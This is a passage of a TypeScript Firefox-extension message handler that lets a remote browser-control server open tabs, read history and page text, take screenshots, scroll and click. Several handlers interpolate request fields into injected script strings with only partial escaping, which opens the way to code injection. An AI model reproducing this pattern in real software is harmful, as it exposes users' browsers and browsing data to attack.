import type { ServerMessageRequest } from "@browser-control-mcp/common";
import { WebsocketClient } from "./client";
import { isCommandAllowed, isDomainInDenyList, getScreenshotConfig } from "./extension-config";

export class MessageHandler {
  private client: WebsocketClient;

  constructor(client: WebsocketClient) {
    this.client = client;
  }

  public async handleDecodedMessage(req: ServerMessageRequest): Promise<void> {
    const isAllowed = await isCommandAllowed(req.cmd);
    if (!isAllowed) {
      throw new Error(`Command '${req.cmd}' is disabled in extension settings`);
    }

    switch (req.cmd) {
      case "open-tab":
        await this.openUrl(req.correlationId, req.url);
        break;
      case "close-tabs":
        await this.closeTabs(req.correlationId, req.tabIds);
        break;
      case "get-tab-list":
        await this.sendTabs(req.correlationId);
        break;
      case "get-browser-recent-history":
        await this.sendRecentHistory(req.correlationId, req.searchQuery);
        break;
      case "get-tab-content":
        await this.sendTabsContent(req.correlationId, req.tabId, req.offset);
        break;
      case "reorder-tabs":
        await this.reorderTabs(req.correlationId, req.tabOrder);
        break;
      case "find-highlight":
        await this.findAndHighlightText(
          req.correlationId,
          req.tabId,
          req.queryPhrase
        );
        break;
      case "take-screenshot":
        await this.takeScreenshot(
          req.correlationId,
          req.tabId,
          req.format,
          req.quality
        );
        break;
      case "scroll-to-position":
        await this.scrollToCoordinates(
          req.correlationId,
          req.tabId,
          req.x,
          req.y,
          req.behavior
        );
        break;
      case "scroll-by-offset":
        await this.scrollByOffset(
          req.correlationId,
          req.tabId,
          req.deltaX,
          req.deltaY,
          req.behavior
        );
        break;
      case "scroll-to-element":
        await this.scrollToElement(
          req.correlationId,
          req.tabId,
          req.selector,
          req.block,
          req.inline,
          req.behavior
        );
        break;
      case "click-at-coordinates":
        await this.clickAtCoordinates(
          req.correlationId,
          req.tabId,
          req.x,
          req.y,
          req.button,
          req.clickType,
          req.modifiers
        );
        break;
      case "click-element":
        await this.clickElement(
          req.correlationId,
          req.tabId,
          req.selector,
          req.button,
          req.clickType,
          req.waitForElement,
          req.scrollIntoView,
          req.modifiers
        );
        break;
      case "hover-element":
        await this.hoverElement(
          req.correlationId,
          req.tabId,
          req.selector,
          req.x,
          req.y,
          req.waitForElement
        );
        break;
      case "type-text":
        await this.typeText(
          req.correlationId,
          req.tabId,
          req.text,
          req.selector,
          req.clearFirst,
          req.typeDelay,
          req.waitForElement
        );
        break;
      case "send-special-keys":
        await this.sendSpecialKeys(
          req.correlationId,
          req.tabId,
          req.keys,
          req.selector,
          req.modifiers
        );
        break;
      case "clear-input-field":
        await this.clearInputField(
          req.correlationId,
          req.tabId,
          req.selector,
          req.waitForElement
        );
        break;
      case "wait-for-time":
        await this.waitForTime(
          req.correlationId,
          req.duration,
          req.message
        );
        break;
      case "wait-for-element":
        await this.waitForElement(
          req.correlationId,
          req.tabId,
          req.selector,
          req.timeout,
          req.pollInterval,
          req.visible
        );
        break;
      case "wait-for-element-visibility":
        await this.waitForElementVisibility(
          req.correlationId,
          req.tabId,
          req.selector,
          req.timeout,
          req.threshold
        );
        break;
      case "wait-for-condition":
        // SECURITY FIX: This feature has been disabled due to critical security vulnerability
        // The previous implementation allowed arbitrary JavaScript execution via new Function()
        // which could lead to complete system compromise, data theft, and malicious redirects
        await this.client.sendErrorToServer(
          req.correlationId,
          "wait-for-condition feature has been disabled for security reasons. " +
          "This feature previously allowed arbitrary JavaScript execution which poses " +
          "a critical security risk. Use specific wait operations like wait-for-element " +
          "or wait-for-element-visibility instead."
        );
        break;
      default:
        const _exhaustiveCheck: never = req;
        console.error("Invalid message received:", req);
    }
  }

  private async openUrl(correlationId: string, url: string): Promise<void> {
    if (!url.startsWith("https://")) {
      console.error("Invalid URL:", url);
      throw new Error("Invalid URL");
    }

    if (await isDomainInDenyList(url)) {
      throw new Error("Domain in user defined deny list");
    }

    const tab = await browser.tabs.create({
      url,
    });

    await this.client.sendResourceToServer({
      resource: "opened-tab-id",
      correlationId,
      tabId: tab.id,
    });
  }

  private async closeTabs(
    correlationId: string,
    tabIds: number[]
  ): Promise<void> {
    await browser.tabs.remove(tabIds);
    await this.client.sendResourceToServer({
      resource: "tabs-closed",
      correlationId,
    });
  }

  private async sendTabs(correlationId: string): Promise<void> {
    const tabs = await browser.tabs.query({});
    await this.client.sendResourceToServer({
      resource: "tabs",
      correlationId,
      tabs,
    });
  }

  private async sendRecentHistory(
    correlationId: string,
    searchQuery: string | null = null
  ): Promise<void> {
    const historyItems = await browser.history.search({
      text: searchQuery ?? "", // Search for all URLs (empty string matches everything)
      maxResults: 200, // Limit to 200 results
      startTime: 0, // Search from the beginning of time
    });
    const filteredHistoryItems = historyItems.filter((item) => {
      return !!item.url;
    });
    await this.client.sendResourceToServer({
      resource: "history",
      correlationId,
      historyItems: filteredHistoryItems,
    });
  }

  private async sendTabsContent(
    correlationId: string,
    tabId: number,
    offset?: number
  ): Promise<void> {
    const tab = await browser.tabs.get(tabId);
    if (tab.url && (await isDomainInDenyList(tab.url))) {
      throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
    }

    const MAX_CONTENT_LENGTH = 50_000;
    const results = await browser.tabs.executeScript(tabId, {
      code: `
      (function () {
        function getLinks() {
          const linkElements = document.querySelectorAll('a[href]');
          return Array.from(linkElements).map(el => ({
            url: el.href,
            text: el.innerText.trim() || el.getAttribute('aria-label') || el.getAttribute('title') || ''
          })).filter(link => link.text !== '' && link.url.startsWith('https://') && !link.url.includes('#'));
        }

        function getTextContent() {
          let isTruncated = false;
          let text = document.body.innerText.substring(${offset || 0});
          if (text.length > ${MAX_CONTENT_LENGTH}) {
            text = text.substring(0, ${MAX_CONTENT_LENGTH});
            isTruncated = true;
          }
          return {
            text, isTruncated
          }
        }

        const textContent = getTextContent();

        return {
          links: getLinks(),
          fullText: textContent.text,
          isTruncated: textContent.isTruncated,
          totalLength: document.body.innerText.length
        };
      })();
    `,
    });
    const { isTruncated, fullText, links, totalLength } = results[0];
    await this.client.sendResourceToServer({
      resource: "tab-content",
      tabId,
      correlationId,
      isTruncated,
      fullText,
      links,
      totalLength,
    });
  }

  private async reorderTabs(
    correlationId: string,
    tabOrder: number[]
  ): Promise<void> {
    // Reorder the tabs sequentially
    for (let newIndex = 0; newIndex < tabOrder.length; newIndex++) {
      const tabId = tabOrder[newIndex];
      await browser.tabs.move(tabId, { index: newIndex });
    }
    await this.client.sendResourceToServer({
      resource: "tabs-reordered",
      correlationId,
      tabOrder,
    });
  }

  private async findAndHighlightText(
    correlationId: string,
    tabId: number,
    queryPhrase: string
  ): Promise<void> {
    const findResults = await browser.find.find(queryPhrase, {
      tabId,
      caseSensitive: true,
    });

    // If there are results, highlight them
    if (findResults.count > 0) {
      // But first, activate the tab. In firefox, this would also enable
      // auto-scrolling to the highlighted result.
      await browser.tabs.update(tabId, { active: true });
      browser.find.highlightResults({
        tabId,
      });
    }

    await this.client.sendResourceToServer({
      resource: "find-highlight-result",
      correlationId,
      noOfResults: findResults.count,
    });
  }

  private async takeScreenshot(
    correlationId: string,
    tabId: number,
    format?: "png" | "jpeg",
    quality?: number
  ): Promise<void> {
    try {
      // Validate input parameters
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      if (format && !["png", "jpeg"].includes(format)) {
        throw new Error(`Invalid format: ${format}. Must be 'png' or 'jpeg'.`);
      }

      if (quality !== undefined && (!Number.isInteger(quality) || quality < 0 || quality > 100)) {
        throw new Error(`Invalid quality: ${quality}. Quality must be an integer between 0 and 100.`);
      }

      // Get screenshot configuration
      const screenshotConfig = await getScreenshotConfig();
      
      // Use provided format or default from config
      const finalFormat = format || screenshotConfig.defaultFormat;
      const finalQuality = quality || screenshotConfig.defaultQuality;

      // Validate that the tab exists and is accessible
      let tab;
      try {
        tab = await browser.tabs.get(tabId);
      } catch (tabError) {
        throw new Error(`Tab with ID ${tabId} not found or is not accessible. The tab may have been closed or does not exist.`);
      }

      if (!tab) {
        throw new Error(`Tab with ID ${tabId} not found`);
      }

      // Check if tab is in a valid state for screenshot
      if (tab.status !== "complete") {
        throw new Error(`Tab ${tabId} is still loading. Please wait for the page to finish loading before taking a screenshot.`);
      }

      // Check if the tab URL is valid and accessible
      if (!tab.url) {
        throw new Error(`Tab ${tabId} does not have a valid URL`);
      }

      // Check for special pages that can't be captured
      if (tab.url.startsWith("about:") || tab.url.startsWith("moz-extension:") || tab.url.startsWith("chrome:")) {
        throw new Error(`Cannot capture screenshot of system page: ${tab.url}`);
      }

      // Check if the tab URL is in the deny list
      if (await isDomainInDenyList(tab.url)) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Validate window ID
      const windowId = tab.windowId;
      if (windowId === undefined || windowId < 0) {
        throw new Error(`Tab ${tabId} does not have a valid window ID`);
      }

      // Check if window exists and is accessible
      try {
        const window = await browser.windows.get(windowId);
        if (!window) {
          throw new Error(`Window ${windowId} not found`);
        }
        if (window.state === "minimized") {
          throw new Error(`Cannot capture screenshot: window ${windowId} is minimized`);
        }
      } catch (windowError) {
        throw new Error(`Window ${windowId} is not accessible: ${windowError instanceof Error ? windowError.message : 'Unknown error'}`);
      }

      // Capture full page screenshot using scroll-and-stitch method
      const imageDataUrl = await this.captureFullPageScreenshot(tabId, windowId, finalFormat, finalQuality);

      // Extract base64 data from data URL
      const base64Data = imageDataUrl.split(',')[1];
      if (!base64Data) {
        throw new Error("Failed to extract base64 data from captured image");
      }

      // Validate base64 data length (basic sanity check)
      if (base64Data.length < 100) {
        throw new Error("Captured image data appears to be too small or corrupted");
      }

      await this.client.sendResourceToServer({
        resource: "screenshot",
        correlationId,
        tabId,
        imageData: base64Data,
        format: finalFormat,
        timestamp: Date.now(),
      });
    } catch (error) {
      console.error("Screenshot capture failed:", error);
      
      // Re-throw with more context if it's already a detailed error
      if (error instanceof Error && (error.message.includes("Tab") || error.message.includes("Window") || error.message.includes("Permission"))) {
        throw error;
      }
      
      // Otherwise, wrap in a generic error
      throw new Error(`Failed to capture screenshot: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  private async captureFullPageScreenshot(
    tabId: number,
    windowId: number,
    format: "png" | "jpeg",
    quality: number
  ): Promise<string> {
    // Maximum height limit to prevent excessive memory usage
    const MAX_PAGE_HEIGHT = 6000;
    
    try {
      // Inject content script to get page dimensions and handle scrolling
      const pageDimensions = await this.getPageDimensions(tabId);
      
      // Calculate the effective capture height (limited by MAX_PAGE_HEIGHT)
      const captureHeight = Math.min(pageDimensions.fullHeight, MAX_PAGE_HEIGHT);
      
      // If the page is short enough to fit in viewport, use single capture
      if (captureHeight <= pageDimensions.viewportHeight) {
        return await this.captureSingleScreenshot(windowId, format, quality);
      }

      // Store original scroll position to restore later
      const originalScrollY = await this.getCurrentScrollPosition(tabId);
      
      try {
        // Calculate number of captures needed
        const viewportHeight = pageDimensions.viewportHeight;
        const numCaptures = Math.ceil(captureHeight / viewportHeight);
        
        // Capture screenshots for each section
        const screenshots: string[] = [];
        
        for (let i = 0; i < numCaptures; i++) {
          const scrollY = i * viewportHeight;
          
          // Don't scroll beyond our capture limit
          if (scrollY >= captureHeight) break;
          
          // Scroll to position
          await this.scrollToPosition(tabId, scrollY);
          
          // Wait for scroll to complete and any lazy content to load
          await this.waitForScrollComplete(tabId, 300);
          
          // Capture this section
          const screenshot = await this.captureSingleScreenshot(windowId, format, quality);
          screenshots.push(screenshot);
        }
        
        // Stitch screenshots together if we have multiple
        if (screenshots.length === 1) {
          return screenshots[0];
        }
        
        return await this.stitchScreenshots(screenshots, viewportHeight, captureHeight);
        
      } finally {
        // Restore original scroll position
        try {
          await this.scrollToPosition(tabId, originalScrollY);
          await this.waitForScrollComplete(tabId, 100);
        } catch (restoreError) {
          console.warn("Failed to restore original scroll position:", restoreError);
        }
      }
      
    } catch (error) {
      console.error("Full page capture failed, falling back to viewport capture:", error);
      
      // Fallback to single viewport capture if full page capture fails
      try {
        return await this.captureSingleScreenshot(windowId, format, quality);
      } catch (fallbackError) {
        throw new Error(`Both full page and fallback screenshot capture failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
      }
    }
  }

  private async getPageDimensions(tabId: number): Promise<{
    fullHeight: number;
    viewportHeight: number;
    viewportWidth: number;
  }> {
    const results = await browser.tabs.executeScript(tabId, {
      code: `
        (function() {
          // Get the full document height
          const body = document.body;
          const html = document.documentElement;
          
          const fullHeight = Math.max(
            body.scrollHeight,
            body.offsetHeight,
            html.clientHeight,
            html.scrollHeight,
            html.offsetHeight
          );
          
          const viewportHeight = window.innerHeight;
          const viewportWidth = window.innerWidth;
          
          return {
            fullHeight: fullHeight,
            viewportHeight: viewportHeight,
            viewportWidth: viewportWidth
          };
        })();
      `
    });
    
    return results[0];
  }

  private async getCurrentScrollPosition(tabId: number): Promise<number> {
    const results = await browser.tabs.executeScript(tabId, {
      code: `window.pageYOffset || document.documentElement.scrollTop;`
    });
    
    return results[0] || 0;
  }

  private async scrollToPosition(tabId: number, scrollY: number): Promise<void> {
    await browser.tabs.executeScript(tabId, {
      code: `
        window.scrollTo({
          top: ${scrollY},
          left: 0,
          behavior: 'instant'
        });
      `
    });
  }

  private async waitForScrollComplete(tabId: number, delay: number = 300): Promise<void> {
    // Wait for scroll to complete and any dynamic content to load
    await new Promise(resolve => setTimeout(resolve, delay));
    
    // Wait for any lazy images to load
    await browser.tabs.executeScript(tabId, {
      code: `
        (function() {
          const images = document.querySelectorAll('img[loading="lazy"], img[data-src]');
          const promises = Array.from(images).map(img => {
            if (img.complete) return Promise.resolve();
            return new Promise(resolve => {
              img.onload = img.onerror = resolve;
              setTimeout(resolve, 1000); // Timeout after 1s
            });
          });
          return Promise.all(promises);
        })();
      `
    });
  }

  private async captureSingleScreenshot(
    windowId: number,
    format: "png" | "jpeg",
    quality: number
  ): Promise<string> {
    const captureOptions: any = { format };
    
    if (format === "jpeg") {
      captureOptions.quality = Math.max(0, Math.min(100, quality));
    }
    
    // Set up timeout for capture operation
    const capturePromise = browser.tabs.captureVisibleTab(windowId, captureOptions);
    const timeoutPromise = new Promise<never>((_, reject) => {
      setTimeout(() => reject(new Error("Screenshot capture timed out after 10 seconds")), 10000);
    });
    
    const imageDataUrl = await Promise.race([capturePromise, timeoutPromise]);
    
    if (!imageDataUrl || !imageDataUrl.startsWith("data:image/")) {
      throw new Error("Invalid image data received from capture operation");
    }
    
    return imageDataUrl;
  }

  private async stitchScreenshots(
    screenshots: string[],
    viewportHeight: number,
    totalHeight: number
  ): Promise<string> {
    // Note: OffscreenCanvas is not available in Firefox extension background scripts
    // Using content script execution to perform canvas operations in a DOM context
    
    // If only one screenshot, return it directly
    if (screenshots.length === 1) {
      return screenshots[0];
    }
    
    try {
      // Try to execute stitching in a content script where DOM APIs are available
      const result = await this.executeStitchingInContentScript(screenshots, totalHeight);
      return result;
    } catch (error) {
      console.error('Content script stitching failed, falling back to simple concatenation:', error);
      // Fallback: return the first screenshot if stitching fails
      // This is not ideal but better than complete failure
      return screenshots[0];
    }
  }

  private async executeStitchingInContentScript(
    screenshots: string[],
    totalHeight: number
  ): Promise<string> {
    // Get an active tab to execute the stitching script
    const tabs = await browser.tabs.query({ active: true, currentWindow: true });
    if (!tabs.length) {
      throw new Error('No active tab available for stitching operation');
    }
    
    const tabId = tabs[0].id!;
    
    // Execute stitching code in content script context where DOM APIs are available
    const stitchingCode = `
      (function() {
        const screenshots = ${JSON.stringify(screenshots)};
        const totalHeight = ${totalHeight};
        
        return new Promise((resolve, reject) => {
          try {
            // Load the first image to get dimensions
            const firstImg = new Image();
            firstImg.onload = function() {
              const width = firstImg.width;
              
              // Create canvas in DOM context (available in content scripts)
              const canvas = document.createElement('canvas');
              canvas.width = width;
              canvas.height = totalHeight;
              const ctx = canvas.getContext('2d');
              
              if (!ctx) {
                reject(new Error('Failed to get canvas context'));
                return;
              }
              
              let currentY = 0;
              let loadedImages = 0;
              const images = [];
              
              // Load all images first
              for (let i = 0; i < screenshots.length; i++) {
                const img = new Image();
                img.onload = function() {
                  images[i] = img;
                  loadedImages++;
                  
                  // When all images are loaded, stitch them
                  if (loadedImages === screenshots.length) {
                    try {
                      currentY = 0;
                      for (let j = 0; j < images.length; j++) {
                        const image = images[j];
                        const remainingHeight = totalHeight - currentY;
                        const imageHeight = Math.min(image.height, remainingHeight);
                        
                        if (imageHeight <= 0) break;
                        
                        ctx.drawImage(
                          image,
                          0, 0, width, imageHeight,
                          0, currentY, width, imageHeight
                        );
                        
                        currentY += imageHeight;
                        if (currentY >= totalHeight) break;
                      }
                      
                      // Convert to data URL
                      const dataUrl = canvas.toDataURL('image/png');
                      resolve(dataUrl);
                    } catch (error) {
                      reject(error);
                    }
                  }
                };
                img.onerror = () => reject(new Error(\`Failed to load image \${i}\`));
                img.src = screenshots[i];
              }
            };
            firstImg.onerror = () => reject(new Error('Failed to load first image'));
            firstImg.src = screenshots[0];
          } catch (error) {
            reject(error);
          }
        });
      })();
    `;
    
    // Execute the stitching code in the content script context
    const results = await browser.tabs.executeScript(tabId, {
      code: stitchingCode
    });
    
    if (!results || !results[0]) {
      throw new Error('Stitching script execution failed');
    }
    
    return results[0] as string;
  }

  private async loadImage(dataUrl: string): Promise<HTMLImageElement> {
    // Replaced createImageBitmap with HTMLImageElement for extension compatibility
    return new Promise((resolve, reject) => {
      const img = new Image();
      img.onload = () => resolve(img);
      img.onerror = () => reject(new Error('Failed to load image'));
      img.src = dataUrl;
    });
  }

  private async scrollToCoordinates(
    correlationId: string,
    tabId: number,
    x: number = 0,
    y: number,
    behavior: "auto" | "smooth" = "smooth"
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      if (!Number.isInteger(x) || x < 0) {
        throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
      }

      if (!Number.isInteger(y) || y < 0) {
        throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
      }

      // Validate that the tab exists and is accessible
      const tab = await browser.tabs.get(tabId);
      if (!tab || tab.status !== "complete") {
        throw new Error(`Tab ${tabId} not found or not ready`);
      }

      // Check if the tab URL is in the deny list
      if (tab.url && (await isDomainInDenyList(tab.url))) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Execute scroll operation and get final position
      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            try {
              // Scroll to the specified position
              window.scrollTo({
                top: ${y},
                left: ${x},
                behavior: '${behavior}'
              });
              
              // Wait a moment for smooth scrolling to complete
              return new Promise(resolve => {
                const checkPosition = () => {
                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
                  resolve({
                    success: true,
                    finalPosition: { x: finalX, y: finalY },
                    message: "Scrolled to position successfully"
                  });
                };
                
                if ('${behavior}' === 'smooth') {
                  setTimeout(checkPosition, 500); // Wait for smooth scroll
                } else {
                  checkPosition();
                }
              });
            } catch (error) {
              return {
                success: false,
                finalPosition: { x: window.pageXOffset || 0, y: window.pageYOffset || 0 },
                message: "Scroll failed: " + error.message
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "scroll-result",
        correlationId,
        success: result.success,
        finalPosition: result.finalPosition,
        message: result.message,
        timestamp: Date.now(),
      });
    } catch (error) {
      console.error("Scroll to position failed:", error);
      await this.client.sendResourceToServer({
        resource: "scroll-result",
        correlationId,
        success: false,
        finalPosition: { x: 0, y: 0 },
        message: `Scroll failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async scrollByOffset(
    correlationId: string,
    tabId: number,
    deltaX: number = 0,
    deltaY: number,
    behavior: "auto" | "smooth" = "smooth"
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      if (!Number.isInteger(deltaX)) {
        throw new Error(`Invalid deltaX: ${deltaX}. DeltaX must be an integer.`);
      }

      if (!Number.isInteger(deltaY)) {
        throw new Error(`Invalid deltaY: ${deltaY}. DeltaY must be an integer.`);
      }

      // Validate that the tab exists and is accessible
      const tab = await browser.tabs.get(tabId);
      if (!tab || tab.status !== "complete") {
        throw new Error(`Tab ${tabId} not found or not ready`);
      }

      // Check if the tab URL is in the deny list
      if (tab.url && (await isDomainInDenyList(tab.url))) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Execute scroll operation and get final position
      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            try {
              // Scroll by the specified offset
              window.scrollBy({
                top: ${deltaY},
                left: ${deltaX},
                behavior: '${behavior}'
              });
              
              // Wait a moment for smooth scrolling to complete
              return new Promise(resolve => {
                const checkPosition = () => {
                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
                  resolve({
                    success: true,
                    finalPosition: { x: finalX, y: finalY },
                    message: "Scrolled by offset successfully"
                  });
                };
                
                if ('${behavior}' === 'smooth') {
                  setTimeout(checkPosition, 500); // Wait for smooth scroll
                } else {
                  checkPosition();
                }
              });
            } catch (error) {
              return {
                success: false,
                finalPosition: { x: window.pageXOffset || 0, y: window.pageYOffset || 0 },
                message: "Scroll failed: " + error.message
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "scroll-result",
        correlationId,
        success: result.success,
        finalPosition: result.finalPosition,
        message: result.message,
        timestamp: Date.now(),
      });
    } catch (error) {
      console.error("Scroll by offset failed:", error);
      await this.client.sendResourceToServer({
        resource: "scroll-result",
        correlationId,
        success: false,
        finalPosition: { x: 0, y: 0 },
        message: `Scroll failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async scrollToElement(
    correlationId: string,
    tabId: number,
    selector: string,
    block: "start" | "center" | "end" | "nearest" = "center",
    inline: "start" | "center" | "end" | "nearest" = "nearest",
    behavior: "auto" | "smooth" = "smooth"
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      if (!selector || typeof selector !== 'string') {
        throw new Error(`Invalid selector: selector must be a non-empty string.`);
      }

      // Basic CSS selector validation to prevent injection
      if (selector.includes('<') || selector.includes('>') || selector.includes('script')) {
        throw new Error(`Invalid selector: potentially dangerous characters detected.`);
      }

      // Validate that the tab exists and is accessible
      const tab = await browser.tabs.get(tabId);
      if (!tab || tab.status !== "complete") {
        throw new Error(`Tab ${tabId} not found or not ready`);
      }

      // Check if the tab URL is in the deny list
      if (tab.url && (await isDomainInDenyList(tab.url))) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Execute scroll operation and get final position
      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            try {
              // Find the element using the provided selector
              const element = document.querySelector('${selector.replace(/'/g, "\\'")}');
              if (!element) {
                return {
                  success: false,
                  finalPosition: {
                    x: window.pageXOffset || document.documentElement.scrollLeft,
                    y: window.pageYOffset || document.documentElement.scrollTop
                  },
                  message: "Element not found with selector: ${selector.replace(/'/g, "\\'")}"
                };
              }
              
              // Scroll element into view
              element.scrollIntoView({
                behavior: '${behavior}',
                block: '${block}',
                inline: '${inline}'
              });
              
              // Wait a moment for smooth scrolling to complete
              return new Promise(resolve => {
                const checkPosition = () => {
                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
                  resolve({
                    success: true,
                    finalPosition: { x: finalX, y: finalY },
                    message: "Scrolled to element successfully"
                  });
                };
                
                if ('${behavior}' === 'smooth') {
                  setTimeout(checkPosition, 500); // Wait for smooth scroll
                } else {
                  checkPosition();
                }
              });
            } catch (error) {
              return {
                success: false,
                finalPosition: {
                  x: window.pageXOffset || document.documentElement.scrollLeft || 0,
                  y: window.pageYOffset || document.documentElement.scrollTop || 0
                },
                message: "Scroll failed: " + error.message
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "scroll-result",
        correlationId,
        success: result.success,
        finalPosition: result.finalPosition,
        message: result.message,
        timestamp: Date.now(),
      });
    } catch (error) {
      console.error("Scroll to element failed:", error);
      await this.client.sendResourceToServer({
        resource: "scroll-result",
        correlationId,
        success: false,
        finalPosition: { x: 0, y: 0 },
        message: `Scroll failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async clickAtCoordinates(
    correlationId: string,
    tabId: number,
    x: number,
    y: number,
    button: "left" | "right" | "middle" = "left",
    clickType: "single" | "double" = "single",
    modifiers: {
      ctrl?: boolean;
      alt?: boolean;
      shift?: boolean;
      meta?: boolean;
    } = {}
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      if (!Number.isInteger(x) || x < 0) {
        throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
      }

      if (!Number.isInteger(y) || y < 0) {
        throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
      }

      // Validate that the tab exists and is accessible
      const tab = await browser.tabs.get(tabId);
      if (!tab || tab.status !== "complete") {
        throw new Error(`Tab ${tabId} not found or not ready`);
      }

      // Check if the tab URL is in the deny list
      if (tab.url && (await isDomainInDenyList(tab.url))) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Execute click operation
      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            try {
              // Get the button code for MouseEvent
              const buttonCode = {
                'left': 0,
                'middle': 1,
                'right': 2
              }['${button}'];
              
              // Find element at coordinates
              const elementAtPoint = document.elementFromPoint(${x}, ${y});
              if (!elementAtPoint) {
                return {
                  success: false,
                  elementFound: false,
                  clickExecuted: false,
                  message: "No element found at coordinates (${x}, ${y})"
                };
              }
              
              // Security check - block clicks on sensitive elements
              const tagName = elementAtPoint.tagName.toLowerCase();
              const inputType = elementAtPoint.type?.toLowerCase();
              if ((tagName === 'input' && (inputType === 'password' || inputType === 'file')) ||
                  tagName === 'script' || tagName === 'iframe') {
                return {
                  success: false,
                  elementFound: true,
                  clickExecuted: false,
                  message: "Click blocked on sensitive element for security reasons"
                };
              }
              
              // Create modifiers object
              const modifierKeys = {
                ctrlKey: ${modifiers.ctrl || false},
                altKey: ${modifiers.alt || false},
                shiftKey: ${modifiers.shift || false},
                metaKey: ${modifiers.meta || false}
              };
              
              // Dispatch click event(s)
              if ('${clickType}' === 'double') {
                // For double click, dispatch both click and dblclick events
                const clickEvent = new MouseEvent('click', {
                  bubbles: true,
                  cancelable: true,
                  view: window,
                  button: buttonCode,
                  buttons: 1 << buttonCode,
                  clientX: ${x},
                  clientY: ${y},
                  ...modifierKeys
                });
                elementAtPoint.dispatchEvent(clickEvent);
                
                const dblClickEvent = new MouseEvent('dblclick', {
                  bubbles: true,
                  cancelable: true,
                  view: window,
                  button: buttonCode,
                  buttons: 1 << buttonCode,
                  detail: 2,
                  clientX: ${x},
                  clientY: ${y},
                  ...modifierKeys
                });
                elementAtPoint.dispatchEvent(dblClickEvent);
              } else if ('${button}' === 'right') {
                // For right click, dispatch contextmenu event
                const contextMenuEvent = new MouseEvent('contextmenu', {
                  bubbles: true,
                  cancelable: true,
                  view: window,
                  button: buttonCode,
                  buttons: 1 << buttonCode,
                  clientX: ${x},
                  clientY: ${y},
                  ...modifierKeys
                });
                elementAtPoint.dispatchEvent(contextMenuEvent);
              } else {
                // Regular click
                const clickEvent = new MouseEvent('click', {
                  bubbles: true,
                  cancelable: true,
                  view: window,
                  button: buttonCode,
                  buttons: 1 << buttonCode,
                  clientX: ${x},
                  clientY: ${y},
                  ...modifierKeys
                });
                elementAtPoint.dispatchEvent(clickEvent);
              }
              
              // Get element info
              const rect = elementAtPoint.getBoundingClientRect();
              const style = window.getComputedStyle(elementAtPoint);
              const isVisible = style.display !== 'none' && style.visibility !== 'hidden' &&
                               rect.width > 0 && rect.height > 0;
              
              return {
                success: true,
                elementFound: true,
                clickExecuted: true,
                message: "Click executed successfully at coordinates (${x}, ${y})",
                elementInfo: {
                  exists: true,
                  visible: isVisible,
                  interactable: !elementAtPoint.disabled,
                  boundingRect: {
                    x: rect.x,
                    y: rect.y,
                    width: rect.width,
                    height: rect.height,
                    top: rect.top,
                    right: rect.right,
                    bottom: rect.bottom,
                    left: rect.left
                  }
                }
              };
            } catch (error) {
              return {
                success: false,
                elementFound: false,
                clickExecuted: false,
                message: "Click failed: " + error.message
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "click-result",
        correlationId,
        success: result.success,
        elementFound: result.elementFound,
        clickExecuted: result.clickExecuted,
        message: result.message,
        timestamp: Date.now(),
        elementInfo: result.elementInfo,
      });
    } catch (error) {
      console.error("Click at coordinates failed:", error);
      await this.client.sendResourceToServer({
        resource: "click-result",
        correlationId,
        success: false,
        elementFound: false,
        clickExecuted: false,
        message: `Click failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async clickElement(
    correlationId: string,
    tabId: number,
    selector: string,
    button: "left" | "right" | "middle" = "left",
    clickType: "single" | "double" = "single",
    waitForElement: number = 5000,
    scrollIntoView: boolean = true,
    modifiers: {
      ctrl?: boolean;
      alt?: boolean;
      shift?: boolean;
      meta?: boolean;
    } = {}
  ): Promise<void> {
    try {
      // Validate inputs
